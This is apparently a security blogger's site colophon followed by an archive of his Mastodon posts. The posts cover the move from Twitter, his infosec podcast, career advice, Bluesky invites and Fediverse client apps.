I have a paid GitHub Personal/Pro subscription which allows my shellsharks. github. io repo (the one my site is built from) to be private. Builds &amp; Deployments are performed via GitHub Actions, and not the traditional Pages Deploy-from-a-branch method. DNS is managed by GoDaddy.

An indieweb. txt file is maintained per the spec. The site theme was built originally used the Agus Makmun Jekyll theme. Since then, it has been heavily modified with a lot of custom CSS, HTML, JavaScript and novel Jekyll configurations. The Statboard requires dynamic refreshing. This has been achieved via GitHub Actions as described here. It also requires some use of jQuery for dynamic fetching of page content from other shellsharks pages A tablet-based writing workflow I have has been described in detail here.

Accessibility improvements are much needed Lunr. js search is a big improvment over super-search but there is still much to be desired An all-emcompoassing mega feed would be a great addition, specifically doing more in a dynamic fashion (rather than a manual one) to PESOS content here The site code desperately needs to be cleaned up and better-commented.

My research and other posts can be found here https://shellsharks. com/! shellsharks @shellsharks 2022-11-08T14:14:27Z @JoshCGrossman Nearly 3k to learn the differences between tools is a hard sell. Your other key takeaways sound more interesting though. I personally have ran scanning / VM programs for years (so would consider myself fairly experienced / advanced) but would be interested in learning more about automation/orchestration in the vuln scanning context, more about tools like Gauntlt, how to pool vuln findings into a ‚Äúsingle pane of glass‚Äù, how to automate risk assessment and prioritization, etc‚Ä¶ Happy to share more ideas with ya too if interested. shellsharks @shellsharks 2022-11-08T14:16:15Z I‚Äôm auto-following anyone in the community feed that posts anything #infosec related. I‚Äôm here for the h4x0r tootstream. shellsharks @shellsharks 2022-11-08T14:33:16Z OK, here‚Äôs my #introduction - #infosec engineer / researcher for 10+ years, I write at https://shellsharks. com/ (which is mostly infosec but has some other stuff too). Joined mastodon like 4 years ago but it didn‚Äôt stick at the time - now I‚Äôm back and everyone else is here too :-). When I‚Äôm not infosec-ing, I‚Äôm likely traveling, enjoying a craft brew or needlessly rewatching Always Sunny in Philadelphia. Was mostly a lurker on Twitter (same handle) but plan to be more of a citizen here. shellsharks @shellsharks 2022-11-08T14:34:15Z meta, Masto etiquette @mttaggart you shamed me into doing my intro üòÖ.

I think those ‚Äúnew‚Äù to large-scale scanning programs likely don‚Äôt appreciate the nuanced difficulties of overcoming the challenges of scale. I‚Äôm not sure VM has the following it deserves yet tbh. There are some (like us I presume) who understand the importance and technical prowess needed to do full-lifecycle VM at-scale, for everyone else, VM is the stepping stone to other ‚Äúbetter‚Äù things - pentesting, redteaming, appsec engineering, etc‚Ä¶ not that I have a great way to market this on hand, but selling this as something that requires real ‚Äúskill‚Äù and not just ‚Äúlearning a bunch of tools‚Äù could help sell it to prospective sec folks.

Feel free to share, comment and keep doin what you‚Äôre doin! ‚ù§Ô∏è shellsharks @shellsharks 2022-11-10T13:21:08Z @graham A list‚Ä¶ Recruiters do in-fact find me and bring decent opportunities. A lot of people use LinkedIn, especially those ‚Äúnew‚Äù in their careers, so it‚Äôs easy to connect there and later share the other platforms I am more active on. I share my personal blog stuff there, I‚Äôve tuned my LI to be pretty much a serving point for my personal/professional site. Though somewhat rare, there is occasionally some interesting content shared there I didn‚Äôt catch elsewhere. Much like OG Facebook, it‚Äôs a way for me to see when old friends/acquaintances/coworkers have changed roles (kinda interesting). Subjecting myself to the endless amount of cringe and ‚Äúlook at me‚Äù garbage that LI infamous for (because I hate myself I suppose). shellsharks @shellsharks 2022-11-10T20:11:50Z @KamprianisM I can‚Äôt speak for anyone but myself, but I‚Äôm having a blast opening up my network and following a ton of new people and those outside the infosec space. I get excited when I see a boost of someone from a unique / new instance and then I ‚Äúcollect‚Äù them. Now, I have a better chance of seeing things they boost from their instance. I have been crawling multiple local feeds and even the full federated feed just soaking it in, following folks, boosting things I like, engaging with people even if I don‚Äôt follow, starring A TON. It‚Äôs been a real blast. I regret not keeping with Mastodon when I first checked it out in 2018. But I‚Äôm here now, it‚Äôs taken the spot Twitter used to have on my iOS Home Screen and I‚Äôm stoked to be part of my growing, diverse community. shellsharks @shellsharks 2022-11-11T05:11:28Z @ianrosenfeld Wow, my #podcast is somehow # 35 on this list ‚ù§Ô∏è.

Or Earth is full of bad things so we shouldn‚Äôt live here. Secjuice don‚Äôt wanna lose their Twitter followership? I‚Äôll add that Mastodon gives you Twitter-esque functionality where you get to moderate it yourself if you own the instance. So yeah, bad things flocked here because they could control it. Up to the greater Fediverse and their instance admins/community to defederate, block and denounce. shellsharks @shellsharks 2022-11-13T22:28:48Z @salthazar I made this suggestion - https://infosec. exchange/@shellsharks/109312621380439732 Not sure what if anything the community has actually settled on though. shellsharks @shellsharks 2022-11-13T22:32:25Z @ImpossibleUmbrella I had this exact same annoyance.

Above all else I think persistence and some brute-forcing helps here. Expand your net (at least at first) by applying to other roles in infosec (beyond Malware roles). I understand that‚Äôs your interest but those roles are somewhat niche and _typically_ staffed by more tenured folks. YoE is a bad metric for technical capability but too often this is what the deciding factor is. I find infosec folks have a much easier time pivoting domains after they get just a little XP anywhere in the field first, so just try to get anything infosec related to begin with. I wrote this ‚Äúplaybook‚Äù up on getting into infosec you might find useful - https://shellsharks. com/getting-into-information-security#getting-into-infosec-playbook. You can skip past the steps you‚Äôve already completed. What‚Äôs important here is translating all your skills and knowledge into a showable portfolio of some kind. For example, if you‚Äôre great at malware analysis, do a write-up of some malware-related CTFs (e. g. FLARE) and post that on a blog. Now you have a professional point-of-presence, a demonstration of your writing ability and an opportunity to talk about your technical skills. Happy to chat more and good luck! shellsharks @shellsharks 2022-11-14T09:45:28Z @sjhilt @tinker said it best here https://infosec. exchange/@tinker/109321493379634906 shellsharks @shellsharks 2022-11-14T17:50:41Z Question for &quot;content creators&quot; out there: Someone reached out to me privately asking for permission to use content of mine in their YouTube videos. They asserted they would be giving me credit, etc. . So the question is, how do I respond to this? In theory, I have no issue with people reading my stuff and talking about it. If they want to riff on it and give me credit then cool! What I wouldn&#39;t be overly keen on is just a 1 to 1 regurgitation of my stuff (even with credit given). Thoughts? shellsharks @shellsharks 2022-11-14T18:09:47Z @x_cli @AaronTalksSec thanks for the guidance.

Beyond that, I‚Äôve added a few other hacker-ey instance timelines to my Masto app (Metatext) such as ioc. exchange and scroll through some of that as well. Community is üî• rn and I‚Äôm soaking it all in. shellsharks @shellsharks 2022-11-14T22:40:20Z @FirehaK @_mattata Yes, this! shellsharks @shellsharks 2022-11-15T15:00:45Z @tdotfish @mkolsek Non they are not. So it needs to be no spaces (CVEXXXXYYYY) or underscores (CVE_XXXX_YYYY) - or some other char but these are the popular suggestions I‚Äôve seen so far. shellsharks @shellsharks 2022-11-15T17:03:53Z @johnterickson got a link to these fine fine products? üòÜ shellsharks @shellsharks 2022-11-16T17:54:57Z @gossithedog Personally, I‚Äôm taking a pretty aggressive follow-a-lot-of-people approach here in the early days with a plan to prune as necessary in a few weeks/months. This way I can see what people tend to post/talk about and can shed anyone who junks up my timeline or posts on things I don‚Äôt care so much about. There‚Äôs a lot of people here I never followed on Twitter and I‚Äôve really enjoyed seeing these new perspectives so far! shellsharks @shellsharks 2022-11-17T04:14:52Z Hey #infosec friends, wanted to share a few of the latest episodes of ‚ÄúThe Shellsharks Podcast‚Äù (my casual show mostly about infosec but sometimes strays into other things). https://shellsharks. com/podcast I love chatting with others in the industry but haven‚Äôt quite found my love for editing the show itself. As such, I had a backlog of a few episodes that I pushed myself to edit and publish over the last 24 hours. So without further babbling, here‚Äôs some links (via my #podcast hosting provider Podbean) to each of the shows. It‚Äôs also available on the usual mainstream platforms! - Vuln Research &amp; Exploit Dev w/ VoidSec - https://shellsharks. podbean. com/e/vuln-research-exploit-dev-w-voidsec/ - Threat Hunting w/ Shahar Vaknin of Hunters. ai - https://shellsharks. podbean. com/e/threat-hunting-w-shahar-vaknin-of-huntersai/ - Interview w/ Security Engineer, Eva Georgieva - https://shellsharks. podbean. com/e/interview-w-security-engineer-eva-georgieva/ Thanks for listening and feel free to shoot over any feedback! shellsharks @shellsharks 2022-11-17T14:11:06Z ‚ÄúIf you find yourself alone, riding in green fields with the sun on your face, do not be troubled. For you are on Mastodon, and not on Twitter!‚Äù - Mastodonius Decimus Meridius #Gladiator is the best movie of all time. I can‚Äôt be convinced otherwise. shellsharks @shellsharks 2022-11-17T15:37:19Z ‚ÄúStars, Boosts &amp; Toots‚Äù - my thoughts and quasi-guide on Mastodon (kinda long post warning) https://shellsharks. com/mastodon @mttaggart told me not to, but here it is anyways! Dropping my ‚Äútake‚Äù inline here. Click through the link for all the other resources and deep links. There is a lot about Mastodon (and the Fediverse) that I have yet to learn, but what I do know is that it has (pretty much) already surpassed what Twitter was to me in both personal and professional contexts. I had a Twitter account for years, and try as I might, I never felt quite comfortable being anything more than a passive consumer - a lurker of those in the #infosectwitter community who had big followings. Though there was of course a decent amount of discussion/engagement within the infosec Twitter world, it often seemed to me very clique-ey, reserved only to those with big followerships or with well-known personas and established circles. I also always had the sense that trying to cultivate a following on Twitter was, sorta cringey. People there seemed more interested in boosting their follower counts or their follower-to-following ratio than expanding their true community. This feeling was ever-perpetuated by the constant deluge of tweets sounding off about how many followers they had, or how close they were to a certain follower threshold, etc‚Ä¶ Look, I get it - I have a blog, a podcast, I understand why people crave followers. It‚Äôs the engagement I am after though, not so much just having my tweets/toots/posts/stuff show up in a lot of people‚Äôs timelines. I genuinely enjoy sharing my thoughts/ideas, and even moreso hearing/learning from others. Naturally, a good way to create this engagement is to network, follow a lot of people and of course, have others ‚Äúfollow‚Äù me. I never had a big following on Twitter (~190ish as of the last time I looked), and I never got much engagement there (partially because I rarely posted). I‚Äôve been on Mastodon for nearly 2 weeks and already I‚Äôve seen much better engagement (and I am not alone). Maybe it‚Äôs the novelty factor, or maybe it‚Äôs because it hasn‚Äôt had time to turn into a toxic stew, it could be because I am more actively engaging. I‚Äôm not really sure yet, but what I do know is the vibe is different. That sense of community is definitely there and I am looking to make the most of it. Alright, so I have a few other thoughts/takes on my Mastodon experience so far, and as I am want to do, I will share via a list! - As others have pointed out, two reasons why Twitter always felt a bit, icky, was because of forced ads in your timeline and the bedeviling algorithm which fed not what YOU wanted into your timeline, but what Twitter thought would yield maximum engagement, which typically meant trying to fill you with rage. Mastodon is a breath of fresh air in comparison. - I joined the infosec. exchange instance, which is relatively quite large (~24k and growing) and have followed nearly 400 people so far. What I‚Äôve seen across my home feed and the local timeline has been really great! No ads, literally just what I‚Äôve signed up for. I‚Äôve been consuming/scrolling most of it so far and have encountered a lot of new people and genuinely look forward to (most) of what they have to share. - Mastodon is a series of unique, networked instances. When folks from other instances are boosted into my timeline, there is a sense of excitement, of exploration. For example, if I see someone with the handle @hax@supercyber. pizza, I think ‚Äúwow! I‚Äôm happy to have discovered this indvidual in the wide Fediverse, and look forward to what they post/boost into my timeline‚Äù. That hunger to follow, to connect moreso than ‚Äúget followers‚Äù is really great. I have this desire to collect as many cool instances and awesome people as I can into my following list. - If you want people to follow you, or engage with you, I highly recommend spending some time to tell people what you‚Äôre all about in your account profile. Also, toss a picture of some kind in there. Anything will do. - Each instance will likely have its own culture, traditions and of course rules. Spend some time trying to figure out what those are, and leverage the content warning (CW) feature to try and be a little less offensive. It‚Äôs not hard to do! - Being on an instance which has a population that best shares your personal/professional interests will give you a local timeline that will help you find people to follow and consume your posts. This is true. But! With a little effort, you can, regardless of what instance you are on, curate a following of people across instances, building a home timeline that is perfect for you, void of ads or algorithmic influences. This feed/timeline will continue to grow and mature thanks to the boosts and discussions of those you follow and engage with. So spend less time trying to find the perfect instance, and more time building that list. If there is any drawback to Mastodon so far that I have seen, it is the lack of full-text search (for privacy reasons). This makes some of the intel-gathering I used to do on Twitter a bit more difficult (I‚Äôm not the only one with this sentiment). One frequent use-case was to search for info on CVEs (e. g. PoCs, research, etc‚Ä¶). To address this concern, the infosec community on Mastodon has been putting their heads together on how best to use hashtags to make intel-gathering possible on Mastodon. #infosec #meta #mastodonthoughts shellsharks @shellsharks 2022-11-17T16:03:51Z re: ‚ÄúStars, Boosts &amp; Toots‚Äù - my thoughts and quasi-guide on Mastodon (kinda long post warning) @taylorparizo agreed! With that said, some clients (Metatext for example) does allow you to see star/reply/boost numbers. shellsharks @shellsharks 2022-11-19T11:36:44Z @mahaloz @adamd I‚Äôve been using Feedly since Reader was sunset.

I thought this for nearly a week but after opening up the 1st-party client and a separate 3rd-party app the issue seemed localized to metatext. After re-installing the app it has resumed its former performant nature. Woo! #mastotips shellsharks @shellsharks 2022-11-21T14:23:46Z @mcread I‚Äôve never used Mastodon in-browser on my mobile device so I really can‚Äôt compare. It worth trying? shellsharks @shellsharks 2022-11-21T14:28:18Z @mcread how does it do with maintaining your position in the timeline? I tend to scroll through everything in my home feed so if the mobile app resets to most recent then that‚Äôd be the one big dealbreaker. Metatext also displays toot/boost/reply count which I like. shellsharks @shellsharks 2022-11-21T16:33:38Z Bummer alert! Atom is being sunsetted - https://github. blog/2022-06-08-sunsetting-atom/.

Anyone out there interested in being on a #podcast? Specifically, my show, The Shellsharks Podcast - https://shellsharks. com/podcast? Generally the show covers infosec topics but I&#39;m also open to anything tech or even beyond! Feel free to reply, DM, email me, w/e if you are interested and what you might be interested in chatting about. Cheers! shellsharks @shellsharks 2022-11-29T15:05:21Z @rebootkid Thanks for offering to come on the show! I think your proposal is relevant to my listeners and I&#39;d be interested in chatting about it =). What days / times are you available to record? For logistics, let me just share with you my pre-written doc I provide to potential guests. . . - To connect, I typically suggest FaceTime or Discord (though I can use any medium). Zoom is great but as I do not have a paid account, sessions are unfortunately limited. Let me know what works best for you and I can work with it! - The show is not broadcasted live. As such, if there is anything you want ultimately edited out of the show, I can absolutely do that. In fact, if we need to scrap the show altogether that is also fine, just let me know. I generally take a few days (at the earliest) to edit and publish so there is always time to decide. - Preparing for an episode, I generally have a few topics in mind but typically not a very strict agenda. The show is relatively ‚Äúchill‚Äù and free-flowing in this way. With that said, I (or we) can prepare a set of topics and questions to cover if that works best! - The show begins in a very casual manner, in most cases mid-conversation. I do my best to facilitate proper/formal introductions but I try to make the show as ‚Äúorganic‚Äù as possible so in some cases this doesn‚Äôt come up naturally. - Shows typically run 45-90 min though there is no real set amount of time. It can be as short or as long as we‚Äôd like! - If there are any other questions, don‚Äôt hesitate to contact me at mike@shellsharks. com or here on Mastodon shellsharks @shellsharks 2022-11-29T15:07:36Z @is_Richardson thanks for the response! Let me think about what we could cover on a collab show. First thing I thought of, since you mentioned you were retired, was maybe doing a &quot;how the industry has changed&quot; episode. But I&#39;d also like to sprinkle in some &quot;classic sci-fi&quot; discussion (as a fan myself). Lastly, since you also host a podcast, we could probably talk about our setups and processes there as well. What days and times are you typically available to record? Thanks again! shellsharks @shellsharks 2022-11-29T15:10:11Z @tsupasat thanks for your response! I think there may be some stuff in what you proposed that could be interesting to chat about. I really don&#39;t know too much about that domain for sure. You also seem to be a Tolkien fan so maybe we can spend an entire episode chatting about that =).

As such, I&#39;ve seen the trends, the threats, the field change just in that time. As for Sci-Fi - I&#39;m really a fan of all sci-fi, especially anything space or dystopian-related. Some favorites include Star Wars (of course), 2001 Space Odyssey, Gattaca, eXistenZ, Blade Runner, Sunshine, Alien, Clockwork orange, etc. . . shellsharks @shellsharks 2022-11-30T14:31:40Z @linxack I have a bunch of Cloud training listed here https://shellsharks. com/online-training#cloud. shellsharks @shellsharks 2022-11-30T14:35:44Z @vict0ni thanks!!

Refresh the feed whereby it would jump allll the way to the top (skipping everything that may have come before the most recent post) 2. Load JUST the next post by clicking a button. Which means I need to keep clicking that button just to load the next and the next post. I‚Äôd prefer to just be able to scroll up in the timeline from where I last left off.

But the reason why I would steer most away from 573 is you can really learn everything from that class by simply purchasing a copy of violent python and learning python basics through any of the free resources out there. shellsharks @shellsharks 2023-02-15T03:06:04Z @shortridge will be purchasing this ‚òëÔ∏è shellsharks @shellsharks 2023-02-15T13:45:02Z @wildbill though SANS courses *are* very practical (instructors speak from experience, hands-on labs, realistic scenarios, etc. . . ), I find the pace of the course and the specific nature of the labs does not translate well to someone new(ish) to python feeling as if they gained that applicable momentum. You&#39;re going to spend two days being rushed through the basics of python and then immediately thrust into writing code for things that you may find it difficult to apply in practice. Learning to code takes methodically adding the building blocks to your understanding and it&#39;s just hard to achieve that when rushed through a 5 day intensive course imo. shellsharks @shellsharks 2023-03-03T04:00:15Z @hdm noooooooooooo!!! shellsharks @shellsharks 2023-03-08T18:20:26Z Anyone have examples of &quot;cool&quot;/unique security team names with a public footprint?

Whatsup? shellsharks @shellsharks 2023-03-23T12:57:05Z @InfoSecSherpa cool! I‚Äôve sent the signal and provided your LI. Maybe they‚Äôll reach out or I‚Äôll let you know if I hear back from my connection. Cheers! shellsharks @shellsharks 2023-04-03T17:23:37Z @shortstack my son‚Äôs daycare facility put out a request for these recently as they use them for returning dirty clothes to parents (among other things).

I don‚Äôt necessarily disagree with the assessment but I think what draws me and others over there is just curiosity, tech-ie early-adopterism and probably some misplaced sense of FOMO. The nice thing is we can go check it out and if it doesn‚Äôt give us what we‚Äôre looking for over time we can come back or just continue to use Mastodon. I personally won‚Äôt give Mastodon up at this point but am genuinely interested in what‚Äôs going on over there, train wreck or not. Plus, it‚Äôs very early days for bsky, though the chances seem abysmally low, there‚Äôs a possibility it grows into something interesting. shellsharks @shellsharks 2023-04-29T19:17:59Z @cirriustech https://infosec-conferences. com/country/united-kingdom/ shellsharks @shellsharks 2023-04-30T00:16:43Z @filippo Agree with ya here. You don‚Äôt follow me I don‚Äôt think but if you gotta invite to share I‚Äôd love it! If not, no worries. Cheers! shellsharks @shellsharks 2023-05-02T15:25:52Z @christophetd if / when u do get an invite code I‚Äôd definitely appreciate the hookup. Cheers! shellsharks @shellsharks 2023-05-03T20:03:12Z @gynvael sorry to hear this! That said, I look forward to reading more of your research and seeing what else you get into! shellsharks @shellsharks 2023-05-03T20:52:36Z @gynvael I guess I‚Äôm more sorry for Google ü§™ shellsharks @shellsharks 2023-05-05T12:00:52Z @gbrls Awesome! Thanks for the kind words. What did you think of the guide? I‚Äôm going to check your blog out now too :-). shellsharks @shellsharks 2023-05-05T18:45:06Z @G33KatWork chills tho shellsharks @shellsharks 2023-05-06T11:06:03Z @gbrls not too many thoughts. I like the clean look. A couple things you could add might be - search feature, dark mode toggle (wish I had a light/dark toggle on my site tbh), humans. txt file &amp; license/disclaimer page. I‚Äôve really enjoyed pouring my individuality into the blog and it has helped me (for the most part) keep up with maintaining it for the last 4 years. So I‚Äôd offer that same advice to you and other writers. Focus on what you want to write and see and others will come in time :-). shellsharks @shellsharks 2023-05-08T13:39:53Z @oldschool my loadout‚Ä¶- iPhone 14 Pro Max- Apple Watch Ultra- iPad Pro (11-inch / 3rd-Gen)- Mac Pro (2013 - Yes, the ‚ÄúTrash Can‚Äù) Eyeing a new laptop of some kind but waiting to see what hardware drops around WWDC time. shellsharks @shellsharks 2023-05-08T14:40:07Z @mttaggart literally though this exact same thing. I also wondered what else was being fetched. shellsharks @shellsharks 2023-05-09T01:46:35Z @jerry Do you have a place where you are centrally documenting all of the various Fediverse infosec. *** properties? Also, where did wiki. infosec. exchange go? I must‚Äôve missed an announcement. Thanks for everything you do! I‚Äôm going to need to up my annual liberapay contribution here soon‚Ä¶ üòÅ shellsharks @shellsharks 2023-05-09T02:46:43Z @hmmmm I‚Äôd take one off ya if you have any left. Thanks!! shellsharks @shellsharks 2023-05-09T15:42:33Z @mort I remember seeing a similar, oddly specific prompt for G 2FA and opened YT on my phone instead and it still worked (I. e. it asked for me to open on my iPad but I too didn‚Äôt have it on me so I opened YT on my phone). Give it a try and good luck! shellsharks @shellsharks 2023-05-09T20:12:45Z @RonahsArk Too much of it probably üòÖ shellsharks @shellsharks 2023-05-09T23:55:53Z @rmogull I have a piece on ‚Äúgetting into infosec‚Äù they may find useful https://shellsharks. com/getting-into-information-security. shellsharks @shellsharks 2023-05-10T12:56:08Z @charlesdardaman Would love to be a mutual and an invite if you still had one to spare. Thanks! shellsharks @shellsharks 2023-05-10T15:14:22Z Anyone familiar with Netflix-Skunkworks Sleepy Puppy XSS payload framework (https://github. com/Netflix-Skunkworks/sleepy-puppy)? I used it years ago and have a need for something like it now but it appears to be deprecated. Is there a spiritual successor to this that anyone is familiar with? Looking to test some 2nd-order/delayed XSS payloads. #infosec #pentesting shellsharks @shellsharks 2023-05-10T17:09:29Z @mttaggart I like Todoist which has both a tradition list-based to-do view and also a somewhat customizable Kanban/board view. shellsharks @shellsharks 2023-05-12T13:38:19Z @zodmagus hey if you do get a Bluesky invite and wouldn‚Äôt mind sharing I‚Äôd appreciate it. Cheers! shellsharks @shellsharks 2023-05-12T13:42:53Z @gsteele hey if you happen to grab an invite code and want to share I‚Äôd appreciate it. Cheers! shellsharks @shellsharks 2023-05-12T13:49:09Z @kylewritescode hey if you happen to get another one I‚Äôd really appreciate the hookup üòÅ. No worries either way. Cheers! shellsharks @shellsharks 2023-05-12T13:51:46Z @kylewritescode Affirmative. I‚Äôll keep an eye out! shellsharks @shellsharks 2023-05-12T14:00:55Z @leighchantelle if you get any invite codes for Bluesky I‚Äôd really appreciate the donation üòÅ. No worries either way. Thanks! shellsharks @shellsharks 2023-05-14T23:30:30Z @SeanWrightSec not yet but actively looking for an invite. You over there yet? If so, How‚Äôs the infosec scene? shellsharks @shellsharks 2023-05-14T23:33:26Z @SeanWrightSec no worries. I‚Äôm sure I‚Äôll get one eventually. I figured it‚Äôd be kinda cyber-quiet so far. You go the domain-as-username route? shellsharks @shellsharks 2023-05-14T23:38:05Z @SeanWrightSec üòÖ. I‚Äôve seen a few folk on here with bsky handles asking the same so you‚Äôre not completely alone. A lot of bsky hate around these parts too so I think some people could be afraid to admit it haha. shellsharks @shellsharks 2023-05-15T00:52:11Z @gsteele will do! Appreciate it. shellsharks @shellsharks 2023-05-16T02:19:51Z @leighchantelle that‚Äôd be awesome! shellsharks @shellsharks 2023-05-16T13:32:24Z Hey @frijolitohey! I enjoyed your threat modeling experience/story and figured I‚Äôd share this resource on threat modeling I developed a whole back - https://shellsharks. com/threat-modeling. As you get more into TM maybe you‚Äôll be interested in trying out one of the multitude of other methodologies out there. shellsharks @shellsharks 2023-05-17T14:14:01Z @0xamit My thoughts exactly. shellsharks @shellsharks 2023-05-17T16:44:44Z @ivory #featurerequest toggle where I can hide posts in the ‚ÄúLocal‚Äù view for people I follow. I like to scroll through both my home and local feeds and it would be awesome to not have to scroll through the same stuff I‚Äôve already seen in ‚Äúhome‚Äù while perusing local. Oh, and I ‚ù§Ô∏è the app! shellsharks @shellsharks 2023-05-17T23:50:53Z @jerry Never. Instead, tell us how much you need to own **all** infosec TLDs and I up my monthly liberapay contribution üíÄ. This is now a game of TLD Pok√©mon. shellsharks @shellsharks 2023-05-18T13:23:09Z @averagesecurityguy I applied =). Have 10+ years of VM experience and have been looking for a place to sharpen my coding skills. Could be a good match! Also adore 1Password having used it since it debuted on the App Store in like 2008 haha. Feel free to check me out and connect! https://shellsharks. com shellsharks @shellsharks 2023-05-22T00:50:42Z @leighchantelle absolutely! Much appreciated. shellsharks @shellsharks 2023-05-22T01:44:29Z @leighchantelle thanks!! shellsharks @shellsharks 2023-05-22T13:24:48Z Alright, I&#39;m over on #bluesky #bsky now as @shellsharks. com (https://bsky. app/profile/shellsharks. com). If interested, Star (if your bsky handle is in your bio) or reply so I can follow you over there! A bit of #infosec stuff is brewing over there but not much. I know bsky will improve with time but so far the features and community on Mastodon and specifically here on infosec. exchange are vastly better than what bsky offers. The make-your-domain-your-bsky-handle is the one fun novelty thing I&#39;ve encountered so far =). For me, I&#39;ll go where the general infosec community goes. I came over in full during one of the mass Twitter migrations and have been happy with the infosec discourse here so far. If another shift happens I may follow but I get the sense that unless something awful happens here this is probably a more permanent home for most (especially given how well @jerry has been running things). shellsharks @shellsharks 2023-05-22T13:35:36Z @jerry bluesky invite fever is unadulterated fomo. Truly not much to do once you&#39;re over there (again, for now). Honestly, me being able to drop 13k wc posts here is enough to get me to stay forever. Plus, I think Mastodon (and the Fediverse at large) has the &quot;we&#39;ve always been here and will continue to be here after bsky or w/e Twitter successor comes and goes&quot; quality which is very appealing. Obviously &quot;big tech&quot; has taken notice too as projects for federation have already begun (e. g. &quot;Barcelona&quot;). shellsharks @shellsharks 2023-05-22T14:09:39Z I&#39;m looking for Fediverse personalities from interesting, lesser seen instances that are chronic boosters, any recommendations? I&#39;m a bit of a collector when it comes to people I follow who hail from unique corners of the Fediverse - and those that are active boosters then further help me connect even deeper. Thanks and I guess boost this too if it can help find even more! shellsharks @shellsharks 2023-05-22T16:55:57Z @Artemis personally, I found it to be pretty overwhelming and crowded, and I‚Äôve been in infosec for 10+ years and have been to a lot of cons. I think it comes down to your personality a bit though. If you are willing to get super involved and sweat out the crowds then u might get a lot out of #defcon. I think it was worth going once to see what it was all about but I wouldn‚Äôt go for the training or talks or anything. Mostly to network and hang out with industry friends. shellsharks @shellsharks 2023-05-22T23:53:08Z My socialization summary (based on a weeks usage from my iPhone&#39;s Screen Time app) - Mastodon ‚Äî&gt; Infosec, general news (50%)- Instagram ‚Äî&gt; Posting travel pics, following gym-fluencers (18%)- Reddit ‚Äî&gt; Infosec, Apple, personal finance, other hobbies (10%)- Slack ‚Äî&gt; Work, other professional communities (6%)- iMessage &amp; Google Voice ‚Äî&gt; Most 1-1 communication (4%)- Linkedin ‚Äî&gt; Lurk, Job searching (3%)- Bluesky ‚Äî&gt; TBD (3%)- Discord ‚Äî&gt; Infosec, gaming (2%)- Blind ‚Äî&gt; TC or GTFO‚Äôing (2%)- Twitter ‚Äî&gt; Still have my username but don‚Äôt really use (1%)- Nostr ‚Äî&gt; Barely use (&lt;1%)- Signal ‚Äî&gt; Chat with specific people (&lt;1%)- Matrix ‚Äî&gt; Barely use (&lt;1%) My takeaways. . . - I main Mastodon- I need to delete Instagram- Slack % doesn&#39;t include work so that is skewed. . . - Discord is low. I need to game more- At over a day (24h) of collective screen time, in a week&#39;s span, I need to re-prioritize some things in my life haha. shellsharks @shellsharks 2023-05-22T23:57:29Z @CyberValken I‚Äôve managed to keep a list of the #infosec books I have and am thinking about getting - https://shellsharks. com/cybersecurity-library. I suspect you have /have heard of many of the popular malware analysis/RE books but let me know if you see something in that list that looks interesting and I can give you my thoughts (if I‚Äôve even cracked it open yet üòÅ). shellsharks @shellsharks 2023-05-23T12:19:54Z Great resume tips from u/SecGRCGuy over on r/cybersecurity yesterday üòÇ - https://www. reddit. com/r/cybersecurity/comments/13p8k5y/if_you_are_currently_applying_for_jobs_then/ shellsharks @shellsharks 2023-05-23T23:30:14Z @gsteele hey Grant! I was actually able to secure an invite from someone else. I appreciate you thinking of me though! shellsharks @shellsharks 2023-05-24T15:30:10Z @ivory Wish Ivory was available for Monterey! üò≠. I have the 2013 Mac Pro and sadly it‚Äôs starting to miss out on more and more (including Ventura). Guess I have more motivation to upgrade now‚Ä¶ shellsharks @shellsharks 2023-05-25T02:05:01Z @radu how stable is it? Any known loss of functionality? I‚Äôd def consider it‚Ä¶ shellsharks @shellsharks 2023-05-25T14:43:13Z @Ember I don‚Äôt know if it‚Äôs Mastodon in general or the @ivory iOS client UI but I‚Äôll engage any poll I see on my timeline because it‚Äôs so satisfying to *click*. shellsharks @shellsharks 2023-05-26T13:52:04Z @womble @campuscodi they got the ‚Äúwave‚Äù (of fake reviews) part down tho‚Ä¶ shellsharks @shellsharks 2023-05-26T19:11:57Z @jerry what unique features for you like about Mona? Anything in particular that puts it above Ivory for you? I downloaded Mona for a min to see but simply liked Ivory‚Äôs UX more so went back to it. shellsharks @shellsharks 2023-05-28T11:35:12Z @hexamander You always buy the domain. Always. shellsharks @shellsharks 2023-05-30T00:57:35Z @jerry go with feet. infosec instead üòú shellsharks @shellsharks 2023-05-30T17:35:00Z Who else thinks it‚Äôs hilarious how Microsoft Threat research team publishes and *names* macOS vulns (e. g. ‚ÄúMigraine‚Äù - https://www. microsoft. com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/) but would absolutely never* find a Windows-borne vuln and draw extra attention to it with a special name üòÇ. shellsharks @shellsharks 2023-05-31T19:19:37Z @kevinmirsky very disappointing indeed. Apollo (3rd party client) is vastly superior to the official Reddit app. This alone isn‚Äôt enough to stop me from using the service but if it results in a huge downturn in the activity within the subs I frequent then it may have that second-order effect in the end. shellsharks @shellsharks 2023-06-01T12:57:15Z @marcchehab No one really talks about #Nostr other than to lambast it as a place crypto bros hang out (and for us infosec folk that unfortunately doesn‚Äôt mean cryptography bros üòú). Whether that‚Äôs true or not I don‚Äôt know. I got on Nostr but didn‚Äôt spend much time trying to network (yet). There was a big push to Mastodon and fortunately @jerry had a welcoming, well-run spot perfect for the infosec community diaspora to land. So I give partial credit to the fact that Mastodon was more ‚Äútalked about‚Äù / marketed by tech media and Jerry‚Äôs excellent stewardship. shellsharks @shellsharks 2023-06-02T15:23:23Z @duanehay I suspect this is still a &quot;to-do&quot; item (https://infosec. exchange/@jerry/110336242275630930) for @jerry . Here&#39;s what I got. . . - Mastodon: infosec. exchange- Lemmy: infosec. pub- Kbin: fedia. io - Calckey: infosec. town- WriteFreely: infosec. press- Akkoma: infosec. place- Other Mastodon: risky. af- PeerTube: video. infosec. exchange- Bookwyrm: books. infosec. exchange- Pixelfed: pixel. infosec. exchange- ELK: elk. infosec. exchange Might be missing one or two but that should keep you busy for a bit =). shellsharks @shellsharks 2023-06-02T19:22:23Z @chmod777 @chunned Yep, here might be the next best bet. But https://updatedsecurity. com or even in the future https://infosec. pub could be places to go as well. shellsharks @shellsharks 2023-06-02T22:27:33Z @frijolito pretty much.

